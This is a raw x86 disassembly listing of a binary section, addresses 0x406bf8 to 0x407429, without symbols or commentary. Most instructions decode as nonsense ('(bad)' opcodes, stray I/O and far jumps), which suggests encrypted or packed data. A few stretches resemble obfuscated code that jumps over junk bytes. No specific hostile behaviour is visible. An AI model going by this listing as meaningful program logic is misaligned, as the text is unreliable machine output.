  406bf8:	jne    0x406bcc
  406bfa:	sbb    al,0xa8
  406bfc:	push   ebx
  406bfd:	add    DWORD PTR ds:0xc5b4c356,esi
  406c03:	mov    ah,0x45
  406c05:	je     0x406be9
  406c07:	sbb    bl,BYTE PTR [edi+0x56da805c]
  406c0d:	cmp    BYTE PTR [esi-0x59],ah
  406c10:	jbe    0x406c22
  406c12:	cmp    esp,DWORD PTR [ebp+0x5298763e]
  406c18:	ins    DWORD PTR es:[edi],dx
  406c19:	(bad)  
  406c1a:	ror    eax,1
  406c1c:	push   0x70
  406c1e:	xchg   esi,eax
  406c1f:	inc    edi
  406c20:	jae    0x406be7
  406c22:	mov    ebx,0x4426081f
  406c27:	inc    ecx
  406c28:	pusha  
  406c29:	sbb    BYTE PTR [eax],al
  406c2b:	stc    
  406c2c:	add    ecx,DWORD PTR [ecx-0x2f]
  406c2f:	data16 mov dl,BYTE PTR [edx+0x50e0844c]
  406c36:	mov    eax,DWORD PTR [eax-0x51]
  406c39:	mov    ch,0x95
  406c3b:	mov    esp,0x2e6d9e6c
  406c40:	es adc cl,ch
  406c43:	ret    
  406c44:	sbb    al,0xa6
  406c46:	mov    BYTE PTR [ebp-0x157077ed],bl
  406c4c:	cmp    ah,ah
  406c4e:	mov    dl,0x11
  406c50:	ror    DWORD PTR [eax-0x43],cl
  406c53:	jbe    0x406c26
  406c55:	cmp    bl,BYTE PTR [eax]
  406c57:	xor    al,0xb3
  406c59:	loopne 0x406cc7
  406c5b:	imul   eax,edi,0xce6cf15a
  406c61:	pop    es
  406c62:	sub    DWORD PTR [ebx-0x50],edx
  406c65:	mov    edx,DWORD PTR [eax]
  406c67:	ja     0x406c07
  406c69:	fcomp  st(0)
  406c6b:	adc    al,0x8f
  406c6d:	lock jmp 0xf98b:0xeae94efa
  406c75:	imul   edx,DWORD PTR [esi+0x678630e0],0x9648f31d
  406c7f:	scas   eax,DWORD PTR es:[edi]
  406c80:	test   dl,bl
  406c82:	pop    edi
  406c83:	stos   BYTE PTR es:[edi],al
  406c84:	clc    
  406c85:	push   ds
  406c86:	addr16 ss jnp 0x406cae
  406c8a:	push   ebp
  406c8b:	in     eax,dx
  406c8c:	aaa    
  406c8d:	cmp    eax,0x7d1bc1fc
  406c92:	mov    eax,0xf18e630
  406c97:	les    eax,FWORD PTR fs:[edx]
  406c9a:	jnp    0x406c8a
  406c9c:	or     BYTE PTR ds:0x6adb733d,ah
  406ca2:	or     eax,0x55c0f2dd
  406ca7:	(bad)  
  406ca8:	push   ecx
  406ca9:	stos   DWORD PTR es:[edi],eax
  406caa:	mov    edx,0x277fb203
  406caf:	adc    eax,0x7b8b26
  406cb4:	aas    
  406cb5:	call   0x23b6ab72
  406cba:	xchg   edi,eax
  406cbb:	sar    esi,cl
  406cbd:	retf   
  406cbe:	neg    BYTE PTR [ebp+0x61]
  406cc1:	push   ds
  406cc2:	(bad)  [esi+0x4362ad82]
  406cc8:	push   ebx
  406cc9:	cs mov dl,0xa1
  406ccc:	ret    
  406ccd:	arpl   WORD PTR [esp+edx*1+0x1155d35d],dx
  406cd4:	popf   
  406cd5:	shl    BYTE PTR [eax],1
  406cd7:	enter  0xbcd8,0xb4
  406cdb:	add    bl,ah
  406cdd:	sbb    al,BYTE PTR [edx]
  406cdf:	lods   al,BYTE PTR ds:[esi]
  406ce0:	call   0x44a799dd
  406ce5:	imul   edi,DWORD PTR [edx+0x4e],0xffffffc6
  406ce9:	repz pop ebp
  406ceb:	sbb    eax,eax
  406ced:	aaa    
  406cee:	sahf   
  406cef:	mov    ds:0x6e0af30d,eax
  406cf4:	and    cl,dh
  406cf6:	sbb    BYTE PTR [ecx],ah
  406cf8:	or     ecx,ecx
  406cfa:	std    
  406cfb:	fisub  WORD PTR [esi]
  406cfd:	pop    esi
  406cfe:	repnz cli 
  406d00:	or     DWORD PTR [esi],esi
  406d02:	js     0x406d80
  406d04:	xchg   ebp,eax
  406d05:	mov    dh,0xdb
  406d07:	mov    dh,BYTE PTR [esi-0x2d]
  406d0a:	icebp  
  406d0b:	add    BYTE PTR [ebp+0x45],al
  406d0e:	mov    WORD PTR [edi-0x51bb9bb2],ss
  406d14:	sbb    eax,0x113b3a04
  406d19:	sub    al,0x47
  406d1b:	xor    eax,0x469d976d
  406d20:	inc    esi
  406d21:	mov    esp,0x63230f62
  406d26:	xor    dl,0xf0
  406d29:	and    al,0x8f
  406d2b:	jno    0x406cc8
  406d2d:	or     bh,ah
  406d2f:	xchg   BYTE PTR [ebx],al
  406d31:	fdivr  QWORD PTR [edx-0x13]
  406d34:	adc    bh,BYTE PTR [eax+ebx*2+0x2f]
  406d38:	mov    BYTE PTR [esi+0x1a],dl
  406d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d3c:	pop    ds
  406d3d:	jle    0x406d19
  406d3f:	cli    
  406d40:	mov    cl,0x73
  406d42:	jae    0x406cf9
  406d44:	inc    ebx
  406d45:	out    dx,eax
  406d46:	std    
  406d47:	in     eax,dx
  406d48:	(bad)  
  406d49:	dec    esp
  406d4a:	cmp    ah,cl
  406d4c:	sbb    eax,0x6616775a
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43382f,0x433713
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433823,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433763,0x43370f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xed
  406d91:	xchg   ebx,eax
  406d92:	push   esi
  406d93:	clc    
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xb97e7e7f
  406d9d:	test   DWORD PTR [esi-0x75cb0e03],0x8a271022
  406da7:	repnz icebp 
  406da9:	or     BYTE PTR [ebp+0x70f79f1f],ah
  406daf:	out    0x7b,eax
  406db1:	mov    esp,0x69d2ea77
  406db6:	add    edi,DWORD PTR [esi+0x29]
  406db9:	add    DWORD PTR [ebx],0x44
  406dbc:	and    BYTE PTR [ecx-0x72],bh
  406dbf:	mov    BYTE PTR [ebx],ah
  406dc1:	mov    bl,0x20
  406dc3:	and    eax,0xeb5460a7
  406dc8:	add    ch,BYTE PTR [ebx+0x46]
  406dcb:	hlt    
  406dcc:	dec    ebx
  406dcd:	xor    al,0xb4
  406dcf:	push   edx
  406dd0:	(bad)  [eax+ecx*2+0x3b]
  406dd4:	sbb    esp,ecx
  406dd6:	hlt    
  406dd7:	sbb    DWORD PTR [edi+0x2],ecx
  406dda:	test   BYTE PTR [esi-0x74bd591d],dh
  406de0:	(bad)  
  406de1:	and    dh,BYTE PTR [eax+ebx*2+0x6c9f3285]
  406de8:	mov    dh,0x29
  406dea:	xchg   esi,eax
  406deb:	sbb    edx,DWORD PTR [eax]
  406ded:	sbb    DWORD PTR ds:0x3b4bcf8f,edi
  406df3:	jne    0x406e39
  406df5:	xchg   edi,eax
  406df6:	cmp    eax,0x9c8da738
  406dfb:	test   al,0x94
  406dfd:	inc    ebx
  406dfe:	out    0xa1,al
  406e00:	sbb    al,0x97
  406e02:	push   ds
  406e03:	xchg   esp,eax
  406e04:	cwde   
  406e05:	test   DWORD PTR [edx+0x7c8c22e0],0xa8e6d5b0
  406e0f:	dec    eax
  406e10:	das    
  406e11:	std    
  406e12:	sub    al,0xfc
  406e14:	or     eax,0xdce061a6
  406e19:	cmp    dl,ah
  406e1b:	gs jno 0x406e0b
  406e1e:	(bad)  
  406e1f:	out    dx,eax
  406e20:	dec    edx
  406e21:	lock xor al,0x3f
  406e24:	mov    WORD PTR [edx],ds
  406e26:	int3   
  406e27:	xor    BYTE PTR [eax+0x2d0917a5],ch
  406e2d:	sub    DWORD PTR [esi-0x1034edfd],0xfffffff4
  406e34:	fisub  WORD PTR [ebp+ebp*2+0x64]
  406e38:	jmp    0xdea4:0x420df671
  406e3f:	fsubr  DWORD PTR [ebp+0x13eb8750]
  406e45:	in     eax,dx
  406e46:	pop    edx
  406e47:	int3   
  406e48:	in     eax,0x74
  406e4a:	xlat   BYTE PTR ds:[ebx]
  406e4b:	int    0xca
  406e4d:	add    DWORD PTR [eax+eiz*2+0x63],eax
  406e51:	ret    
  406e52:	enter  0x6dbc,0xb9
  406e56:	(bad)  
  406e57:	aam    0x1e
  406e59:	mov    eax,0xa6b177ca
  406e5f:	jp     0x406eb6
  406e61:	xchg   ecx,eax
  406e62:	mov    edx,0x4a504aad
  406e67:	mov    ds:0x433a6ef6,eax
  406e6c:	retf   
  406e6d:	ror    BYTE PTR [edi],0xd1
  406e70:	ja     0x406e84
  406e72:	out    0x62,eax
  406e74:	xor    al,0x9a
  406e76:	es push 0x67
  406e79:	ror    DWORD PTR [edi+0x45aee32b],0x0
  406e80:	pop    ecx
  406e81:	out    dx,eax
  406e82:	lea    edi,[eax+edx*8]
  406e85:	mov    al,0x33
  406e87:	push   ebp
  406e88:	int3   
  406e89:	mov    esi,0x300a460f
  406e8e:	mov    al,ds:0x4ffe04d8
  406e93:	mov    bl,0xcd
  406e95:	mov    al,ds:0xf9fb342b
  406e9a:	icebp  
  406e9b:	sub    ecx,DWORD PTR [edx-0x1a80053]
  406ea1:	adc    edi,edi
  406ea3:	(bad)  
  406ea4:	jno    0x406e96
  406ea6:	sbb    al,BYTE PTR ds:0xa990fc65
  406eac:	xor    DWORD PTR [eax+0x6fd0dd17],esp
  406eb2:	jae    0x406ef6
  406eb4:	xchg   edi,eax
  406eb5:	fs je  0x406eb9
  406eb8:	mov    ecx,0xc21b1b26
  406ebd:	frstor [edx]
  406ebf:	test   eax,0x2a8f86bc
  406ec4:	push   es
  406ec5:	rcl    DWORD PTR [eax-0x5c0e8f62],cl
  406ecb:	ret    0xf409
  406ece:	and    DWORD PTR [ebx],0x8a450c2e
  406ed4:	leave  
  406ed5:	sahf   
  406ed6:	sub    dl,bl
  406ed8:	cwde   
  406ed9:	jecxz  0x406f48
  406edb:	sub    DWORD PTR [esi+0x567fc6ab],ecx
  406ee1:	or     ch,BYTE PTR [esi]
  406ee3:	dec    ebx
  406ee4:	push   ebx
  406ee5:	cld    
  406ee6:	sahf   
  406ee7:	mov    ebp,0x67b405bd
  406eec:	mov    esi,fs
  406eee:	push   ecx
  406eef:	dec    edi
  406ef0:	add    esp,DWORD PTR [ecx-0x63]
  406ef3:	push   cs
  406ef4:	sub    edi,DWORD PTR ds:0x32f08cb4
  406efa:	mov    bl,BYTE PTR [esi-0x782c450c]
  406f00:	xchg   edi,eax
  406f01:	dec    edi
  406f02:	leave  
  406f03:	sti    
  406f04:	push   ebx
  406f05:	pop    DWORD PTR [edx+0x315cbec7]
  406f0b:	dec    eax
  406f0c:	adc    BYTE PTR [eax+esi*8-0x281b1cfa],dl
  406f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f14:	jl     0x406efb
  406f16:	std    
  406f17:	rol    DWORD PTR [ecx+0x46],cl
  406f1a:	fst    DWORD PTR [eax]
  406f1c:	pop    edi
  406f1d:	or     ch,dl
  406f1f:	fs jo  0x406eef
  406f22:	hlt    
  406f23:	in     eax,dx
  406f24:	sub    al,0xc4
  406f26:	xlat   BYTE PTR ds:[ebx]
  406f27:	sub    al,0x67
  406f29:	rol    esi,cl
  406f2b:	div    DWORD PTR [edx-0x1e04694a]
  406f31:	call   0x3743:0xd895e4ca
  406f38:	mov    esi,cs
  406f3a:	aad    0x91
  406f3c:	aas    
  406f3d:	mov    ecx,DWORD PTR [ecx+0x13]
  406f40:	sti    
  406f41:	and    bh,BYTE PTR [ebp-0x70]
  406f44:	repz not DWORD PTR [ebx+eax*2]
  406f48:	je     0x406f02
  406f4a:	scas   eax,DWORD PTR es:[edi]
  406f4b:	add    eax,0xfc942bd3
  406f50:	(bad)  
  406f52:	fwait
  406f53:	cmc    
  406f54:	enter  0x974b,0x64
  406f58:	jecxz  0x406f5e
  406f5a:	pop    edi
  406f5b:	mov    edi,DWORD PTR [ecx-0x6c]
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43370f,0x433753
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x7a6feda3
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xfc7e7e7f
  406f9f:	aaa    
  406fa0:	mov    BYTE PTR [eax],cl
  406fa2:	jp     0x406fa5
  406fa4:	sub    dl,BYTE PTR fs:[edx]
  406fa7:	(bad)  
  406fa8:	mov    esp,0x4d752f23
  406fad:	push   es
  406fae:	sti    
  406faf:	xor    DWORD PTR [ebx],esi
  406fb1:	jge    0x406f39
  406fb3:	push   edi
  406fb4:	adc    BYTE PTR [ebx-0x556c9d9d],al
  406fba:	std    
  406fbb:	icebp  
  406fbc:	pop    ss
  406fbd:	push   0xffffffd2
  406fbf:	xlat   BYTE PTR ds:[ebx]
  406fc0:	fs jge 0x407014
  406fc3:	adc    cl,bh
  406fc5:	mov    al,ds:0x8af0ce80
  406fca:	cmp    eax,0xe77e6a21
  406fcf:	xchg   edi,eax
  406fd0:	sbb    bh,bh
  406fd2:	xchg   esp,eax
  406fd3:	mov    ch,0xf9
  406fd5:	mov    gs,WORD PTR [eax+0x4b8b2f38]
  406fdb:	test   BYTE PTR [ebx],0x26
  406fde:	or     eax,0x4e99c399
  406fe3:	fcomi  st,st(1)
  406fe5:	push   eax
  406fe6:	imul   eax,DWORD PTR [edi-0x5b],0xffffffca
  406fea:	or     ecx,edi
  406fec:	fcmovu st,st(5)
  406fee:	dec    edi
  406fef:	out    0x67,eax
  406ff1:	iret   
  406ff2:	mov    al,0x80
  406ff4:	aam    0xd0
  406ff6:	loopne 0x407007
  406ff8:	call   0x5bd8:0xd671e0b
  406fff:	adc    ch,al
  407001:	rol    BYTE PTR [eax+0x4b728044],1
  407007:	mov    edx,0x3fd2545c
  40700c:	jnp    0x40703b
  40700e:	(bad)  
  40700f:	xor    al,0x82
  407011:	hlt    
  407012:	sub    DWORD PTR [edi+0x5427a216],eax
  407018:	xlat   BYTE PTR ds:[ebx]
  407019:	push   ebx
  40701a:	cmp    eax,0xc80c9c19
  40701f:	add    DWORD PTR [edi-0x2c28091b],0xffffffbd
  407026:	aas    
  407027:	jne    0x406ff5
  407029:	sahf   
  40702a:	xchg   edx,eax
  40702b:	fwait
  40702c:	clc    
  40702d:	adc    DWORD PTR es:[edx+0x19e331e1],ecx
  407034:	aas    
  407035:	pop    edx
  407036:	fcomp  QWORD PTR [edx]
  407038:	sub    cl,BYTE PTR [edx+0x0]
  40703b:	loopne 0x406fee
  40703d:	mov    bh,BYTE PTR [ebx+0x4ff422d6]
  407043:	dec    esp
  407044:	out    dx,al
  407045:	add    esp,DWORD PTR [edx]
  407047:	pushf  
  407048:	dec    ebx
  407049:	dec    ebp
  40704a:	dec    esp
  40704b:	jb     0x40702b
  40704d:	popf   
  40704e:	in     eax,0xe9
  407050:	and    ah,BYTE PTR [edi]
  407052:	cli    
  407053:	das    
  407054:	mov    eax,ds:0x6b5c7947
  407059:	cmp    dl,bh
  40705b:	pop    esp
  40705c:	dec    esi
  40705d:	pop    ds
  40705e:	mov    bl,0xc7
  407060:	inc    esp
  407061:	mul    DWORD PTR [esi+0x6e]
  407064:	xlat   BYTE PTR ds:[ebx]
  407065:	xchg   esp,eax
  407066:	add    BYTE PTR [edx-0x74],ch
  407069:	xor    BYTE PTR [edi-0x56],cl
  40706c:	das    
  40706d:	ins    DWORD PTR es:[edi],dx
  40706e:	pop    ds
  40706f:	sbb    eax,0xa229fc68
  407074:	in     eax,0x15
  407076:	inc    esi
  407077:	pop    ds
  407078:	cld    
  407079:	sub    ebx,DWORD PTR [esi]
  40707b:	xchg   esp,eax
  40707c:	inc    esi
  40707d:	jl     0x407048
  40707f:	pop    esi
  407080:	ret    0x183c
  407083:	popa   
  407084:	jl     0x4070e6
  407086:	jne    0x4070a2
  407088:	fcom   DWORD PTR [edx-0x11]
  40708b:	ret    0xee95
  40708e:	pop    esp
  40708f:	xor    DWORD PTR [edx],esi
  407091:	pushf  
  407092:	fcmovu st,st(7)
  407094:	pop    edi
  407095:	sub    al,0xff
  407097:	add    ebp,edx
  407099:	mov    eax,0x2254ab44
  40709e:	dec    edi
  40709f:	inc    dl
  4070a1:	out    0xf1,al
  4070a3:	aas    
  4070a4:	push   esi
  4070a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a6:	or     edx,DWORD PTR [eax-0x21d01acb]
  4070ac:	sub    DWORD PTR [eax-0x2b],0x51
  4070b0:	dec    edi
  4070b1:	mov    eax,ds:0x4cbf33e4
  4070b6:	inc    DWORD PTR [ebp-0x7742662f]
  4070bc:	jmp    0x8e5f:0xff73ff7b
  4070c3:	xchg   BYTE PTR [eax+0x3b],al
  4070c6:	test   BYTE PTR [eax+0x56],bl
  4070c9:	out    0xab,eax
  4070cb:	jb     0x40705c
  4070cd:	xor    BYTE PTR [ecx+0x2fbc633b],al
  4070d3:	mov    edi,0x1f9da802
  4070d8:	dec    ecx
  4070d9:	mov    cl,0xa3
  4070db:	aad    0xb1
  4070dd:	pop    edi
  4070de:	js     0x407075
  4070e0:	or     eax,0x57945b87
  4070e5:	mov    dh,0x15
  4070e7:	mov    ecx,0xc6a90a2d
  4070ec:	mov    esi,0x73022049
  4070f1:	stos   BYTE PTR es:[edi],al
  4070f2:	sahf   
  4070f3:	fdiv   DWORD PTR [eax+0x6e]
  4070f6:	psraw  mm1,QWORD PTR ds:0x17ef6eb7
  4070fd:	enter  0x9bc7,0x1e
  407101:	xor    DWORD PTR ds:0xa591fbf4,0xffffffe4
  407108:	icebp  
  407109:	or     BYTE PTR ds:0xa1d4d29c,bh
  40710f:	xor    DWORD PTR [esi-0x72647b69],eax
  407115:	es mov ebp,0x182062d3
  40711b:	xor    al,0xfd
  40711d:	bound  eax,QWORD PTR [eax+eiz*2+0x572d8f80]
  407124:	scas   al,BYTE PTR es:[edi]
  407125:	fs icebp 
  407127:	test   eax,0xaabf8b09
  40712c:	inc    esp
  40712d:	leave  
  40712e:	ret    
  40712f:	retf   0x4ec5
  407132:	jmp    0x8229c30
  407137:	mov    esp,0xb168e815
  40713c:	and    edx,ebx
  40713e:	int3   
  40713f:	sbb    al,0x53
  407141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407142:	sbb    ebp,DWORD PTR [ecx+0x26a85e23]
  407148:	mov    dl,0x7e
  40714a:	fild   WORD PTR [eax+ecx*4+0x6b1b04ac]
  407151:	jmp    0x94352582
  407156:	jecxz  0x4070da
  407158:	div    al
  40715a:	add    al,0x2b
  40715c:	dec    ebp
  40715d:	inc    esi
  40715e:	out    dx,al
  40715f:	xor    edi,edi
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	iret   
  40717c:	adc    bh,BYTE PTR [edx+0x7ec4cc9a]
  407182:	jle    0x407140
  407184:	jg     0x407204
  407186:	jle    0x407160
  407188:	lock loopne 0x4071a5
  40718b:	aam    0xcb
  40718d:	adc    BYTE PTR [edx-0x34f5792e],ah
  407193:	sub    DWORD PTR [ecx-0x2c],ebp
  407196:	sar    esp,cl
  407198:	sar    esp,0x6c
  40719b:	popa   
  40719c:	lock mov BYTE PTR ss:[ecx],bh
  4071a0:	call   0xa3fe68ff
  4071a5:	cmc    
  4071a6:	push   ebx
  4071a7:	or     dh,bh
  4071a9:	push   ss
  4071aa:	iret   
  4071ab:	dec    edi
  4071ac:	jbe    0x4071b0
  4071ae:	cmp    dl,BYTE PTR [eax+0x77]
  4071b1:	mov    esp,0x24bf44ce
  4071b6:	nop
  4071b7:	or     DWORD PTR [edx+esi*4],ebx
  4071ba:	repnz in al,0xae
  4071bd:	sub    dl,BYTE PTR [ecx+0x46]
  4071c0:	retf   0xcd37
  4071c3:	scas   al,BYTE PTR es:[edi]
  4071c4:	cmp    ch,0x49
  4071c7:	cmp    bl,BYTE PTR [esi]
  4071c9:	jmp    0x407181
  4071cb:	pop    edi
  4071cc:	ficomp WORD PTR [edi+0x42]
  4071cf:	xlat   BYTE PTR ds:[ebx]
  4071d0:	xchg   edi,eax
  4071d1:	fs push ebp
  4071d3:	mov    esi,0x530fcc90
  4071d8:	sbb    eax,0x404b69cf
  4071dd:	rcr    BYTE PTR [esi],1
  4071df:	call   0x3df:0x254d5133
  4071e6:	aas    
  4071e7:	or     ebx,DWORD PTR [esi+0x4c1c52b6]
  4071ed:	in     eax,0xe1
  4071ef:	iret   
  4071f0:	cs mov ah,0xc5
  4071f3:	adc    eax,0xd7644de7
  4071f8:	xchg   esi,eax
  4071f9:	mov    cl,0x2f
  4071fb:	pop    edx
  4071fc:	adc    bl,cl
  4071fe:	jmp    0x2b2d:0x317aa3db
  407205:	enter  0x8f9f,0x49
  407209:	ins    BYTE PTR es:[edi],dx
  40720a:	push   esi
  40720b:	ins    BYTE PTR es:[edi],dx
  40720c:	pushf  
  40720d:	and    al,0xe
  40720f:	scas   al,BYTE PTR es:[edi]
  407210:	inc    ebx
  407211:	jge    0x407258
  407213:	sub    dh,al
  407215:	add    eax,DWORD PTR fs:[edx]
  407218:	xchg   esi,esp
  40721a:	gs xchg edx,eax
  40721c:	sbb    al,BYTE PTR [edi+0x61f42984]
  407222:	mov    dl,0xdb
  407224:	cmp    eax,0x45978
  407229:	adc    ebx,DWORD PTR [esi]
  40722b:	inc    esi
  40722c:	(bad)  
  40722d:	pop    esp
  40722e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40722f:	arpl   WORD PTR [eax],bx
  407231:	aam    0x2f
  407233:	jno    0x40728a
  407235:	fucomip st,st(5)
  407237:	jp     0x4071ef
  407239:	jge    0x4072a0
  40723b:	sub    esp,esi
  40723d:	sub    ebp,DWORD PTR [esi]
  40723f:	add    edi,DWORD PTR [esi]
  407241:	mov    esp,0x255d39b1
  407246:	mov    ebp,0x67665c80
  40724b:	les    eax,FWORD PTR [ecx]
  40724d:	mov    ebx,0xbf20aff1
  407252:	ss retf 0xed9
  407256:	fld    DWORD PTR ss:[edx+eiz*2-0x16f3b46e]
  40725e:	cmp    BYTE PTR [ebp+0x385c9a4a],bh
  407264:	push   esp
  407265:	pop    ebp
  407266:	mov    ds,WORD PTR ds:0xf4cdce41
  40726c:	ja     0x40727e
  40726e:	ds out dx,al
  407270:	jae    0x407217
  407272:	popf   
  407273:	lds    ebx,FWORD PTR [eax+0xf38b899]
  407279:	test   al,0xb7
  40727b:	xchg   esp,eax
  40727c:	repnz arpl bx,di
  40727f:	popa   
  407280:	sbb    DWORD PTR [edi+0x30],esi
  407283:	xor    DWORD PTR [ebp+0x66],ecx
  407286:	loopne 0x4072c1
  407288:	lea    edx,[ecx+0x26e163da]
  40728e:	mov    cl,0x8a
  407290:	fstp   TBYTE PTR [ebp-0x9]
  407293:	push   esi
  407294:	mov    al,ds:0xa280b28d
  407299:	imul   ebx,ebx,0x2f6712eb
  40729f:	pop    eax
  4072a0:	mov    edi,0xd1979a0f
  4072a5:	sti    
  4072a6:	lea    edx,[edx]
  4072a8:	jno    0x40728e
  4072aa:	push   ebx
  4072ab:	inc    ecx
  4072ac:	or     BYTE PTR [edi-0xe54adad],dh
  4072b2:	mov    DWORD PTR [eax],ebp
  4072b4:	add    al,0x7
  4072b6:	cdq    
  4072b7:	sub    eax,DWORD PTR [eax+0x4fb3cc7f]
  4072bd:	stos   DWORD PTR es:[edi],eax
  4072be:	icebp  
  4072bf:	jge    0x407322
  4072c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c2:	cmp    bh,BYTE PTR [ecx+ebx*8-0x34]
  4072c6:	cmp    esp,DWORD PTR [ebx+edi*8+0x690a1926]
  4072cd:	sbb    eax,0xa39029b5
  4072d2:	add    esi,DWORD PTR [eax+edi*2-0x295d9229]
  4072d9:	pop    ss
  4072da:	mov    ds:0x916c4554,eax
  4072df:	pop    esp
  4072e0:	xor    BYTE PTR [ebp+0x4a],bh
  4072e3:	or     ah,BYTE PTR [ecx+esi*8-0x1c]
  4072e7:	sub    bh,BYTE PTR [esi-0x3eb85a01]
  4072ed:	and    DWORD PTR [eax-0x16],edi
  4072f0:	mov    ecx,0xfa46780c
  4072f5:	sbb    BYTE PTR [ecx+0x4e],al
  4072f8:	jp     0x407359
  4072fa:	neg    DWORD PTR [ecx-0x2f]
  4072fd:	bound  ebp,QWORD PTR [ebx+0x46]
  407300:	push   ebp
  407301:	sbb    DWORD PTR [ebx],edi
  407303:	call   DWORD PTR [esi-0x38]
  407306:	mov    bl,0x91
  407308:	xchg   esi,eax
  407309:	sahf   
  40730a:	ud2    
  40730c:	ss (bad) 
  40730f:	out    dx,eax
  407310:	leave  
  407311:	xor    al,0x95
  407313:	sbb    al,0x61
  407315:	adc    edi,DWORD PTR [edx-0x31a41b3a]
  40731b:	iret   
  40731c:	pop    esp
  40731d:	fcom   DWORD PTR [edx]
  40731f:	adc    eax,0x96851371
  407324:	loope  0x4072d3
  407326:	inc    ecx
  407327:	hlt    
  407328:	jb     0x407331
  40732a:	cmp    ah,BYTE PTR [edi+ebx*1]
  40732d:	add    al,0xdd
  40732f:	loopne 0x407324
  407331:	sbb    eax,0x281d7bad
  407336:	jmp    0xa01d116b
  40733b:	dec    esi
  40733c:	mov    edx,0xe8ef9be2
  407341:	cmp    al,0xb9
  407343:	ins    BYTE PTR es:[edi],dx
  407344:	jmp    0x840f:0x403c949a
  40734b:	daa    
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407359
  407387:	jno    0x40736f
  407389:	lods   al,BYTE PTR ds:[esi]
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x7c7e7e7c
  407393:	inc    ebx
  407394:	fwait
  407395:	xor    al,0xa0
  407397:	and    al,0xd
  407399:	mov    dh,0xdd
  40739b:	cli    
  40739c:	retf   
  40739d:	popf   
  40739e:	or     bl,bh
  4073a0:	in     al,dx
  4073a1:	fiadd  WORD PTR [eax+0xe]
  4073a4:	xchg   ch,cl
  4073a6:	ins    DWORD PTR es:[edi],dx
  4073a7:	jl     0x407337
  4073a9:	test   DWORD PTR [ebx+0x63],edx
  4073ac:	adc    DWORD PTR [edi],ebp
  4073ae:	in     eax,dx
  4073af:	fld    TBYTE PTR [edi-0x581bb777]
  4073b5:	push   esp
  4073b6:	das    
  4073b7:	rcr    bh,cl
  4073b9:	jb     0x40735c
  4073bb:	loope  0x407410
  4073bd:	lods   eax,DWORD PTR ds:[esi]
  4073be:	xchg   ebp,eax
  4073bf:	addr16 sbb eax,0x661913ba
  4073c5:	call   0x7be5:0x31f14b04
  4073cc:	test   BYTE PTR [esi+edx*1],al
  4073cf:	push   ebp
  4073d0:	(bad)  
  4073d1:	stos   BYTE PTR es:[edi],al
  4073d2:	call   0x8dca416e
  4073d7:	bound  edi,QWORD PTR [ecx]
  4073d9:	xor    BYTE PTR [ecx-0x5a9d7d78],cl
  4073df:	repnz dec esp
  4073e1:	sti    
  4073e2:	aam    0x7e
  4073e4:	nop
  4073e5:	push   0x1c08d8aa
  4073ea:	or     BYTE PTR [edi+0x3bdb12dc],ch
  4073f0:	dec    eax
  4073f1:	out    dx,al
  4073f2:	or     BYTE PTR [eax],ah
  4073f4:	xor    eax,0xb967a17d
  4073f9:	xor    eax,0xd99988fd
  4073fe:	adc    eax,0x8ad46ba3
  407403:	jmp    0x4073fe
  407405:	in     eax,dx
  407406:	xor    dl,ah
  407408:	jle    0x4073f9
  40740a:	or     BYTE PTR [ebx],0x4b
  40740d:	inc    esi
  40740e:	out    dx,eax
  40740f:	dec    esi
  407410:	lods   eax,DWORD PTR ds:[esi]
  407411:	sbb    BYTE PTR [eax+0x18],0xb1
  407415:	push   eax
  407416:	iret   
  407417:	leave  
  407418:	scas   eax,DWORD PTR es:[edi]
  407419:	or     BYTE PTR [ecx+ebp*8],0xd4
  40741d:	xor    BYTE PTR [esi],0x6a
  407420:	sahf   
  407421:	into   
  407422:	(bad)  
  407423:	cmp    dl,BYTE PTR [esi]
  407425:	dec    edx
  407426:	hlt    
  407427:	fsubr  QWORD PTR [ebx]
  407429:	xor    al,0x20
